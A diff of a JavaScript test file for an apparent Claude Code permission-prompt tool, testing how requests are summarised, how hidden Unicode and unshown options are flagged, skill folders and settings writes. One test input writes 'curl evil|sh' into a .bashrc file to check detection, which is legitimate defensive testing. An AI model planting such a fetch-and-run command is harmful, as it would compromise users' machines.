@@ -12,7 +12,7 @@ import {
     HOOK_TIMEOUT_S, settingsLayout, formatSettings,
     parseNeedsAuth, newAuthNames, parseMcpList, mcpSummary,
     SAFE_MODES, rulesOf, removeRule, setDefaultMode, claudeSettingsFiles, readSettingsAsync, writeSettingsAsync,
-    parsePluginList, parseSkillMeta, skillOverride, setSkillOverride,
+    parsePluginList, parseSkillMeta, skillOverride, setSkillOverride, skillSources, parseEnviron,
 } from '../src/helpers/claude.js';
 import { ConfigStore } from '../src/helpers/config.js';
 
@@ -112,15 +112,15 @@ for (let t of ['ExitPlanMode', 'AskUserQuestion', 'dialogFoo'])
     ok(passThrough(req(t)), `${t} goes to the terminal`);
 ok(!passThrough(req('Bash', { command: 'ls' })), 'main-session Bash is held');
 eq(describeRequest(req('Bash', { command: 'npm test' }), 'notchnux-bf'),
-    { title: 'notchnux-bf wants to run a command', body: 'npm test', exact: true }, 'Bash');
-eq(describeRequest(req('Edit', { file_path: '/x/src/a.js' }), 'nn'), { title: 'nn wants to edit a.js', body: '/x/src/a.js', exact: true }, 'Edit');
+    { title: 'notchnux-bf wants to run a command', body: 'npm test', exact: true, always: null }, 'Bash');
+eq(describeRequest(req('Edit', { file_path: '/x/src/a.js' }), 'nn'), { title: 'nn wants to edit a.js', body: '/x/src/a.js', exact: false, always: null }, 'Edit');
 eq(describeRequest(req('NotebookEdit', { notebook_path: '/x/n.ipynb' }), 'nn').title, 'nn wants to edit n.ipynb', 'NotebookEdit');
 eq(describeRequest(req('Read', { file_path: '/etc/hosts' }), 'nn').title, 'nn wants to read hosts', 'Read');
 eq(describeRequest(req('WebFetch', { url: 'https://docs.example.com/a?b=1' }), 'nn'),
-    { title: 'nn wants to fetch docs.example.com', body: 'https://docs.example.com/a?b=1', exact: true }, 'WebFetch');
+    { title: 'nn wants to fetch docs.example.com', body: 'https://docs.example.com/a?b=1', exact: true, always: null }, 'WebFetch');
 eq(describeRequest(req('mcp__claude_ai_Canva__create-design', { q: 1 }), 'nn'),
-    { title: 'nn wants to use claude_ai_Canva · create-design', body: '{"q":1}', exact: true }, 'MCP tool');
-eq(describeRequest(req('Glob', { pattern: '*.js' }), 'nn'), { title: 'nn wants to use Glob', body: '{"pattern":"*.js"}', exact: true }, 'other tool');
+    { title: 'nn wants to use claude_ai_Canva · create-design', body: '{"q":1}', exact: true, always: null }, 'MCP tool');
+eq(describeRequest(req('Glob', { pattern: '*.js' }), 'nn'), { title: 'nn wants to use Glob', body: '{"pattern":"*.js"}', exact: true, always: null }, 'other tool');
 eq(describeRequest(req('Bash', { command: 'ls' })).title, 'NotchNux wants to run a command', 'no session name → folder');
 let long = describeRequest(req('Bash', { command: 'a\nb\nc\nd\ne\nf' }), 'nn').body;
 eq(long, 'a\nb\nc\nd…', 'body capped at 4 lines');
@@ -132,6 +132,25 @@ let bidi = describeRequest(req('Bash', { command: 'echo \u202Eabc' }), 'nn');
 ok(!bidi.exact && bidi.body === 'echo \uFFFDabc', `bidi override shown as a marker, not exact: ${JSON.stringify(bidi)}`);
 ok(!describeRequest(req('Bash', { command: 'echo a\u0007b' }), 'nn').exact, 'control character is not exact');
 ok(describeRequest(req('Bash', { command: 'printf "a\tb"' }), 'nn').exact, 'a tab is fine');
+ok(describeRequest(req('Bash', { command: 'ls', description: 'list', timeout: 5, run_in_background: false }), 'nn').exact,
+    'Bash with harmless extra keys is exact');
+ok(!describeRequest(req('Bash', { command: 'ls', dangerouslyDisableSandbox: true }), 'nn').exact, 'an unshown Bash option is not exact');
+ok(!describeRequest(req('Write', { file_path: '/h/.bashrc', content: 'curl evil|sh' }), 'nn').exact, 'file content not shown → not exact');
+ok(!describeRequest(req('Edit', { file_path: '/x/a.js', old_string: 'a', new_string: 'b' }), 'nn').exact, 'an edit is not exact');
+ok(describeRequest(req('Read', { file_path: '/etc/hosts', offset: 1, limit: 5 }), 'nn').exact, 'Read with offset/limit is exact');
+ok(describeRequest(req('mcp__s__t', { a: 1 }), 'nn').exact, 'MCP args are shown in full');
+for (let ch of ['\u200B', '\u2028', '\u0085', '\u061C', '\uFEFF', '\u{E0041}'])
+    ok(!describeRequest(req('Bash', { command: `echo a${ch}b` }), 'nn').exact, `hidden ${JSON.stringify(ch)} is not exact`);
+const addR = rules => ({ type: 'addRules', rules, behavior: 'allow', destination: 'localSettings' });
+eq(describeRequest(req('Bash', { command: 'npm test' }, { permission_suggestions: [addR([{ toolName: 'Bash', ruleContent: 'npm test:*' }])] }), 'nn').always,
+    'Bash(npm test:*)', 'always allow shows the rule it adds');
+eq(describeRequest(req('Bash', { command: 'ls' }, { permission_suggestions: [{ type: 'setMode', mode: 'acceptEdits', destination: 'session' }] }), 'nn').always,
+    null, 'a mode switch is never offered');
+eq(describeRequest(req('Bash', { command: 'ls' }, { permission_suggestions: [addR([{ toolName: 'Edit' }])] }), 'nn').always,
+    null, 'a rule for another tool is never offered');
+eq(describeRequest(req('Read', { file_path: '/x' }, { permission_suggestions: [addR([{ toolName: 'Read' }])] }), 'nn').always,
+    'Read', 'a whole-tool rule shows as the tool');
+eq(describeRequest(req('Bash', { command: 'ls' }), 'nn').always, null, 'no suggestions → no always');
 
 const sugg = [{ type: 'addRules', rules: [{ toolName: 'Bash', ruleContent: 'npm test' }], behavior: 'allow', destination: 'localSettings' }];
 const decision = (kind, r) => JSON.parse(decisionBody(kind, r)).hookSpecificOutput;
@@ -188,7 +207,7 @@ eq(parseSession(sess({ status: 'idle' })).cwd, '/home/u/Projetos/NotchNux', 'ses
 const authText = JSON.stringify({ 'claude.ai Figma': { timestamp: 100, id: 'x' }, 'plugin:bio-research:wiley': { timestamp: 300 } });
 eq([...parseNeedsAuth(authText)], [['claude.ai Figma', 100], ['plugin:bio-research:wiley', 300]], 'auth cache names + times');
 eq([...parseNeedsAuth('')], [], 'no auth cache');
-eq([...parseNeedsAuth('{"a": 4')], [], 'half-written auth cache');
+ok(parseNeedsAuth('{"a": 4') === null, 'half-written auth cache → null (keep the last one)');
 eq(newAuthNames(null, parseNeedsAuth(authText)), [], 'first read: no alert');
 eq(newAuthNames(new Map([['claude.ai Figma', 100]]), parseNeedsAuth(authText)), ['plugin:bio-research:wiley'], 'newly needs login');
 const mcpOut = [
@@ -270,6 +289,12 @@ eq(parseSkillMeta('---\nname: folded\ndescription: >\n  first line\n  second lin
 eq(parseSkillMeta('# no frontmatter'), { name: '', description: '' }, 'no frontmatter');
 eq([skillOverride({}, 'a'), skillOverride({ skillOverrides: { a: 'off' } }, 'a'), skillOverride({ skillOverrides: { a: 'name-only' } }, 'a')],
     ['on', 'off', 'name-only'], 'skill override state');
+eq(skillSources(['/p/a', GLib.get_home_dir(), '/p/a', '']).map(x => [x.dir, x.settings, x.where]), [
+    [`${GLib.get_home_dir()}/.claude/skills`, SETTINGS_PATH, ''],
+    ['/p/a/.claude/skills', '/p/a/.claude/settings.local.json', 'a'],
+], 'skill folders: personal once, each other live folder once');
+eq(parseEnviron('PATH=/a:/b\0HOME=/h\0EMPTY=\0junk\0'), ['PATH=/a:/b', 'HOME=/h', 'EMPTY='], 'environ parsed');
+eq(parseEnviron(''), [], 'no environ');
 const sk = { model: 'opus', skillOverrides: { keep: 'name-only' } };
 eq(setSkillOverride(sk, 'x', false).skillOverrides, { keep: 'name-only', x: 'off' }, 'skill off');
 eq(text(setSkillOverride(setSkillOverride(sk, 'x', false), 'x', true)), text(sk), 'skill off → on restores exactly');
@@ -298,12 +323,15 @@ GLib.file_set_contents(`${io}/real.json`, four);
 GLib.spawn_command_line_sync(`ln -s real.json ${GLib.shell_quote(`${io}/link.json`)}`);
 let r = settle(readSettingsAsync(`${io}/link.json`));
 eq([r.path, r.settings.permissions.allow], [`${io}/real.json`, ['A']], 'symlink followed');
-settle(writeSettingsAsync(r.path, removeRule(r.settings, 'allow', 'A'), r.layout));
+settle(writeSettingsAsync(r.path, removeRule(r.settings, 'allow', 'A'), r.layout, { backup: true }));
 eq(ioRead(`${io}/real.json`), four.replace('\n            "A"\n        ', ''), 'written in its own layout');
 eq(ioRead(`${io}/real.json~`), four, 'previous file kept as backup');
 ok(GLib.file_test(`${io}/link.json`, GLib.FileTest.IS_SYMLINK), 'symlink still a symlink');
-settle(writeSettingsAsync(`${io}/new/.claude/settings.json`, { a: 1 }, missing.layout));
-eq(ioRead(`${io}/new/.claude/settings.json`), '{\n  "a": 1\n}\n', 'creates the folder for a new file');
+let refused = false;
+try { settle(writeSettingsAsync(`${io}/new/.claude/settings.json`, { a: 1 }, missing.layout)); } catch (e) { refused = true; }
+ok(refused && !GLib.file_test(`${io}/new`, GLib.FileTest.EXISTS), 'never creates folders (every target already exists)');
+settle(writeSettingsAsync(`${io}/plain.json`, { a: 1 }, missing.layout));
+ok(!GLib.file_test(`${io}/plain.json~`, GLib.FileTest.EXISTS), 'no backup unless asked (it would land in a repo)');
 GLib.spawn_command_line_sync(`rm -rf ${GLib.shell_quote(io)}`);
 
 // ---- config: approvals on/off (read-only checks; never saves) ----
